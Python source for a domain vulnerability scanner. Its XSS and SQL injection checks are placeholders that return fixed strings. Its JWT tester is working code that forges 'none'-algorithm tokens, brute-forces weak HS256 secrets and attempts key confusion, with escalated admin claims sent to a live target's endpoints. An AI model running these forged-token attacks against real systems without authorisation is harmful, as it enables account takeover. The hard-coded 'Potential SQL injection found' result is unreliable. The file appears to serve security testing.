import requests
import jwt
import json
import base64
from datetime import datetime
import logging
from urllib.parse import urljoin, urlparse
import re
import time

logger = logging.getLogger(__name__)

class DomainService:

    supported_attacks = {
        "xss": "Cross-Site Scripting",
        "sql_injection": "SQL Injection",
        "jwt_vulnerabilities": "JWT Vulnerabilities",
        # Add more attack types here
    }

    @staticmethod
    def scan_domain(domain, attacks):
        results = {}

        for attack in attacks:
            if attack == "xss":
                results['xss'] = DomainService.check_xss(domain)
            elif attack == "sql_injection":
                results['sql_injection'] = DomainService.check_sql_injection(domain)
            elif attack == "jwt_vulnerabilities":
                results['jwt_vulnerabilities'] = DomainService.check_jwt_vulnerabilities(domain)
            # Add more attack types here
            else:
                results[attack] = "Unknown attack type"

        return {
            "domain": domain,
            "results": results
        }

    # Define methods for checking vulnerabilities over here
    @staticmethod
    def check_xss(domain):
        # Mock logic for XSS vulnerability
        return "No XSS vulnerability found"

    @staticmethod
    def check_sql_injection(domain):
        # Mock logic for SQLi vulnerability
        return "Potential SQL injection found"
    
    @staticmethod
    def check_jwt_vulnerabilities(domain):
        """Check JWT vulnerabilities for the given domain"""
        try:
            tester = JWTVulnerabilityTester()
            # Ensure proper URL format
            if not domain.startswith(('http://', 'https://')):
                domain = 'https://' + domain
            
            results = tester.test_url(domain, include_brute_force=False)
            return results
        except Exception as e:
            logger.error(f"Error testing JWT vulnerabilities for {domain}: {e}")
            return {"error": f"Failed to test JWT vulnerabilities: {str(e)}"}
    
    @classmethod
    def get_supported_attacks(cls):
        return cls.supported_attacks


class JWTVulnerabilityTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        # Common weak secrets
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'test', 'key', 'jwt', 'token', 
            'auth', 'user', 'default', 'qwerty', 'your-256-bit-secret', 'secretkey',
            'jwtsecret', 'mysecret', 'supersecret', 'topsecret', 'changeme',
            'password123', '12345678', 'abcdef', 'letmein', 'welcome',
            '', 'null', 'undefined', 'none', '0', '1', 'true', 'false'
        ]
    
    def extract_jwt_from_response(self, response):
        """Extract JWT tokens from response headers and body"""
        tokens = []
        
        # Check Authorization header
        auth_header = response.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            tokens.append(auth_header.split(' ')[1])
        
        # Check Set-Cookie headers for JWT patterns
        cookies = response.headers.get('Set-Cookie', '')
        if cookies:
            jwt_pattern = r'[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
            found_tokens = re.findall(jwt_pattern, cookies)
            tokens.extend(found_tokens)
        
        # Check response body for JWT patterns
        try:
            if response.text:
                jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                found_tokens = re.findall(jwt_pattern, response.text)
                # Additional validation - JWTs should be at least 50 chars
                valid_tokens = [t for t in found_tokens if len(t) > 50 and t.count('.') == 2]
                tokens.extend(valid_tokens)
        except:
            pass
        
        return list(set(tokens))
    
    def scan_common_endpoints(self, base_url):
        """Scan common endpoints that might return JWTs"""
        endpoints = [
            '/', '/home', '/dashboard', '/profile', '/user', '/admin',
            '/api', '/api/user', '/api/profile', '/api/me', '/me',
            '/api/v1/user', '/v1/user', '/health', '/status'
        ]
        
        tokens = []
        endpoint_results = []
        
        for endpoint in endpoints:
            try:
                url = urljoin(base_url, endpoint)
                response = self.session.get(url, timeout=10)
                found_tokens = self.extract_jwt_from_response(response)
                tokens.extend(found_tokens)
                
                endpoint_results.append({
                    'endpoint': endpoint,
                    'status': response.status_code,
                    'tokens_found': len(found_tokens)
                })
                
            except Exception:
                continue
        
        return list(set(tokens)), endpoint_results
    
    def decode_jwt_header(self, token):
        """Decode JWT header without verification"""
        try:
            header = jwt.get_unverified_header(token)
            return header
        except Exception as e:
            logger.error(f"Error decoding JWT header: {e}")
            return None
    
    def decode_jwt_payload(self, token):
        """Decode JWT payload without verification"""
        try:
            payload = jwt.decode(token, options={"verify_signature": False})
            return payload
        except Exception as e:
            logger.error(f"Error decoding JWT payload: {e}")
            return None
    
    def test_none_algorithm(self, token, target_url):
        """Test if server accepts 'none' algorithm"""
        try:
            payload = self.decode_jwt_payload(token)
            if not payload:
                return False, "Could not decode original token"
            
            # Modify payload to be more convincing (admin privileges)
            test_payload = payload.copy()
            if 'role' in test_payload:
                test_payload['role'] = 'admin'
            if 'admin' in test_payload:
                test_payload['admin'] = True
            
            # Create token with 'none' algorithm
            header = {"alg": "none", "typ": "JWT"}
            
            # Create unsigned token
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(test_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            none_token = f"{header_b64}.{payload_b64}."
            
            # Test multiple endpoints
            test_endpoints = ['/', '/profile', '/admin', '/dashboard', '/api/user']
            
            for endpoint in test_endpoints:
                test_url = urljoin(target_url, endpoint)
                
                # Test with Authorization header
                response = self.session.get(
                    test_url,
                    headers={'Authorization': f'Bearer {none_token}'},
                    timeout=10
                )
                
                if response.status_code in [200, 201, 202] and 'error' not in response.text.lower():
                    return True, f"Server accepts 'none' algorithm at {endpoint}"
            
            return False, "Server properly rejects 'none' algorithm"
            
        except Exception as e:
            return False, f"Error testing 'none' algorithm: {e}"
    
    def test_weak_secret(self, token, target_url):
        """Test common weak secrets"""
        try:
            original_payload = self.decode_jwt_payload(token)
            if not original_payload:
                return False, "Could not decode original token"
            
            # Create a modified payload for testing
            test_payload = original_payload.copy()
            if 'role' in test_payload:
                test_payload['role'] = 'admin'
            if 'admin' in test_payload:
                test_payload['admin'] = True
            
            for secret in self.weak_secrets:
                try:
                    # Create new token with weak secret
                    new_token = jwt.encode(test_payload, secret, algorithm='HS256')
                    
                    # Test multiple endpoints
                    test_endpoints = ['/', '/profile', '/admin', '/dashboard', '/api/user']
                    
                    for endpoint in test_endpoints:
                        test_url = urljoin(target_url, endpoint)
                        
                        response = self.session.get(
                            test_url,
                            headers={'Authorization': f'Bearer {new_token}'},
                            timeout=10
                        )
                        
                        if response.status_code in [200, 201, 202] and 'error' not in response.text.lower():
                            return True, f"Weak secret found: '{secret}' (endpoint: {endpoint})"
                            
                except Exception:
                    continue
            
            return False, "No weak secrets found"
            
        except Exception as e:
            return False, f"Error testing weak secrets: {e}"
    
    def test_key_confusion(self, token, target_url):
        """Test RS256 to HS256 key confusion"""
        try:
            header = self.decode_jwt_header(token)
            payload = self.decode_jwt_payload(token)
            
            if not header or not payload:
                return False, "Could not decode token"
            
            if header.get('alg') != 'RS256':
                return False, "Token is not RS256 (skipping key confusion test)"
            
            # Common public key patterns to try
            test_keys = [
                "-----BEGIN PUBLIC KEY-----",
                "public",
                "key",
                "rsa",
                "publickey"
            ]
            
            for key in test_keys:
                try:
                    # Create HS256 token using potential public key as secret
                    confused_token = jwt.encode(payload, key, algorithm='HS256')
                    
                    test_endpoints = ['/profile', '/admin', '/dashboard', '/api/user']
                    
                    for endpoint in test_endpoints:
                        test_url = urljoin(target_url, endpoint)
                        
                        response = self.session.get(
                            test_url,
                            headers={'Authorization': f'Bearer {confused_token}'},
                            timeout=10
                        )
                        
                        if response.status_code in [200, 201, 202]:
                            return True, f"Possible key confusion vulnerability (key: {key[:20]}...)"
                        

                            
                except Exception:
                    continue
            
            return False, "No key confusion vulnerability detected"
            
            
        except Exception as e:
            return False, f"Error testing key confusion: {e}"
    
    def test_url(self, url, include_brute_force=False):
        """Main testing function"""
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'jwt_found': False,
            'vulnerabilities': [],
            'tokens_analyzed': 0,
            'discovery_methods': [],
            'endpoint_scan': []
        }
        
        try:
            logger.info(f"Starting JWT scan for: {url}")
            
            # Scan common endpoints
            tokens, endpoint_results = self.scan_common_endpoints(url)
            results['endpoint_scan'] = endpoint_results
            if tokens:
                results['discovery_methods'].append('endpoint_scanning')
            
            # Remove duplicates
            tokens = list(set(tokens))
            results['tokens_analyzed'] = len(tokens)
            
            if not tokens:
                results['message'] = "No JWT tokens discovered through scanning"
                return results
            
            results['jwt_found'] = True
            logger.info(f"Found {len(tokens)} JWT tokens")
            
            # Analyze each token found
            for i, token in enumerate(tokens):
                logger.info(f"Analyzing token {i+1}/{len(tokens)}")
                
                # Test 'none' algorithm vulnerability
                is_vuln, msg = self.test_none_algorithm(token, url)
                if is_vuln:
                    results['vulnerabilities'].append({
                        'type': 'none_algorithm',
                        'severity': 'CRITICAL',
                        'description': msg,
                        'token_sample': token[:50] + '...'
                    })
                
                # Test weak secret vulnerability
                is_vuln, msg = self.test_weak_secret(token, url)
                if is_vuln:
                    results['vulnerabilities'].append({
                        'type': 'weak_secret',
                        'severity': 'HIGH', 
                        'description': msg,
                        'token_sample': token[:50] + '...'
                    })
                
                # Test key confusion vulnerability
                is_vuln, msg = self.test_key_confusion(token, url)
                if is_vuln:
                    results['vulnerabilities'].append({
                        'type': 'key_confusion',
                        'severity': 'MEDIUM',
                        'description': msg,
                        'token_sample': token[:50] + '...'
                    })
            
            if not results['vulnerabilities']:
                results['message'] = "JWT tokens found but no vulnerabilities detected"
            else:
                results['message'] = f"Found {len(results['vulnerabilities'])} JWT vulnerabilities"
            
            return results
            
        except requests.RequestException as e:
            results['error'] = f"Network error: {e}"
            return results
        except Exception as e:
            results['error'] = f"Unexpected error: {e}"
            return results